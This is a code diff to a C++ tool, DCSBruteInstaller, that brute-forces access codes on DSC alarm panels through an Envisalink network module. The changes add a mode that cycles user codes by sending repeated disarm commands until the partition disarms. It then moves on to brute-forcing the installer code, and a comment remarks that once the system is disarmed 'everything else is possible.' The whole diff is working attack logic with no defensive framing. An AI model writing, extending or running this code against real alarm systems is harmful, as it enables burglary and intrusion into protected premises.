@@ -102,6 +102,14 @@ class DCSBruteInstaller : public CORE::CObserver
     typedef CORE::CTEventHandlerFunctor< DCSBruteInstaller > TEventCallback;
     typedef std::vector< CORE::CString > TStringVector;
 
+    enum EAttackType
+    {
+        ATTACKTYPE_NONE =      0 ,
+        ATTACKTYPE_USER =      1 ,
+        ATTACKTYPE_INSTALLER = 2
+    };
+    typedef enum EAttackType TAttackType;
+    
     COMCORE::CHostAddress m_envisalinkAddr;
     COMCORE::CTCPClientSocket m_tcpClientSocket;
     CORE::CString m_password;
@@ -111,6 +119,9 @@ class DCSBruteInstaller : public CORE::CObserver
     bool m_requestSystemInfo;
     bool m_sendIndividualKeystrokes;
     bool m_ackReceivedForLastSend;
+    TAttackType m_currentAttack;
+    bool m_attackInstaller;
+    bool m_attackUser;
 
     public:
 
@@ -396,8 +407,7 @@ class DCSBruteInstaller : public CORE::CObserver
 
     void SendInstallerCode( void )
     {GUCEF_TRACE;
-        SendPartitionDisarm();
-        return;
+
         if ( m_sendIndividualKeystrokes )
         {
             SendInstallerCodeSingleStroke();
@@ -579,6 +589,7 @@ class DCSBruteInstaller : public CORE::CObserver
                     case 23:
                     {
                         // this sometimes comes dispite the system being armed, maybe some race condition in Envisalink???
+                        // managed to successfully get a code dispite this so ignore... :/
                         GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "Envisalink error: API System Not Armed (sent in response to a disarm command)" );
                         break;
                     }
@@ -634,7 +645,23 @@ class DCSBruteInstaller : public CORE::CObserver
                         {
                             SendStatusReportRequest();
                         }
-                        SendInstallerCode();
+                        if ( m_attackUser )
+                        {
+                            // attack user first, if so desired we will auto-transition into an installer attack once a user code is found
+                            // and the system is disarmed. The system needs to be disarmed in order to run an installer attack!
+                            m_currentAttack = ATTACKTYPE_USER;
+                            SendPartitionDisarm();
+                        }
+                        else
+                        if ( m_attackInstaller )
+                        {
+                            m_currentAttack = ATTACKTYPE_INSTALLER;
+                            SendInstallerCode();
+                        }
+                        else
+                        {
+                            m_currentAttack = ATTACKTYPE_NONE;
+                        }
                         break;
                     }
                     case '2':
@@ -732,11 +759,6 @@ class DCSBruteInstaller : public CORE::CObserver
                 
                 m_ackReceivedForLastSend = true;
                 SendQueuedMessage();
-                
-                //
-
-                //++m_masterCode;
-                //SendPartitionDisarm( partitionId );
                 break;
             }
             case 670:
@@ -744,9 +766,11 @@ class DCSBruteInstaller : public CORE::CObserver
                 GUCEF_LOG( CORE::LOGLEVEL_IMPORTANT, "DCSBruteInstaller: Envisalink tells us we sent an Invalid Access Code for partition " + msg.SubstrFromRange( 3, 4 ) );
                 m_ackReceivedForLastSend = true;
 
-++m_masterCode;                
-                ++m_installerCode;
-                SendInstallerCode();
+                switch ( m_currentAttack )
+                {
+                    case ATTACKTYPE_INSTALLER: { ++m_installerCode; SendInstallerCode(); break; }
+                    case ATTACKTYPE_USER: { ++m_masterCode; SendPartitionDisarm(); break; }
+                }                
                 break;
             }
             case 671:
@@ -796,8 +820,23 @@ class DCSBruteInstaller : public CORE::CObserver
 
                 // This could mean we have found he user code for a user Id!!!
                 GUCEF_LOG( CORE::LOGLEVEL_CRITICAL, "DCSBruteInstaller: Envisalink tells us User Opening, A partition has been disarmed by a user for partition " + partitionStr + " with userId " + msg.SubstrFromRange( 4, 8 ) + ". The current last user code was " + CORE::UInt16ToString( m_masterCode ) );
-
-
+                if ( m_currentAttack == ATTACKTYPE_USER )
+                {
+                    // We were indeed running a user code attack, not someone entering the code from a panel
+                    if ( m_attackInstaller )
+                    {
+                        // Now that the system is disarmed we can proceed to attaking the installer code.
+                        // You cannot run that attack if the system is armed so we had to get a user code first
+                        m_currentAttack = ATTACKTYPE_INSTALLER;
+                    }
+                    else
+                    {
+                        // Since 1 user code is enough to disarm the system we will leave it at that 
+                        // with the system disarmed everything else is possible.
+                        m_currentAttack = ATTACKTYPE_NONE;
+                        CORE::CCoreGlobal::Instance()->GetApplication().Stop();
+                    }
+                }
                 break;
             }
             case 751 :
@@ -951,7 +990,7 @@ class DCSBruteInstaller : public CORE::CObserver
             m_installerCode = CORE::StringToUInt16( valueStr );
         }
 
-        valueStr = keyValueList.GetValueAlways( "MasterStartingCode" );
+        valueStr = keyValueList.GetValueAlways( "UserStartingCode" );
         if ( !valueStr.IsNULLOrEmpty() )
         {
             m_masterCode = CORE::StringToUInt16( valueStr );
@@ -962,6 +1001,17 @@ class DCSBruteInstaller : public CORE::CObserver
         {
             m_requestSystemInfo = CORE::StringToBool( valueStr );
         }
+
+        valueStr = keyValueList.GetValueAlways( "BruteForceUserCode" );
+        if ( !valueStr.IsNULLOrEmpty() )
+        {
+            m_attackUser = CORE::StringToBool( valueStr );
+        }
+        valueStr = keyValueList.GetValueAlways( "BruteForceInstallerCode" );
+        if ( !valueStr.IsNULLOrEmpty() )
+        {
+            m_attackInstaller = CORE::StringToBool( valueStr );
+        }        
 
         CORE::CString tcpPortStr = keyValueList.GetValueAlways( "TcpPort" );
         if ( !tcpPortStr.IsNULLOrEmpty() )
@@ -997,7 +1047,10 @@ class DCSBruteInstaller : public CORE::CObserver
           m_masterCode( 0 )                   ,
           m_requestSystemInfo( true )         ,
           m_sendIndividualKeystrokes( false ) ,
-          m_ackReceivedForLastSend( true )
+          m_ackReceivedForLastSend( true )    ,
+          m_currentAttack( ATTACKTYPE_NONE )  ,
+          m_attackUser( false )               ,
+          m_attackInstaller( true )
     {GUCEF_TRACE;
 
         RegisterEventHandlers();
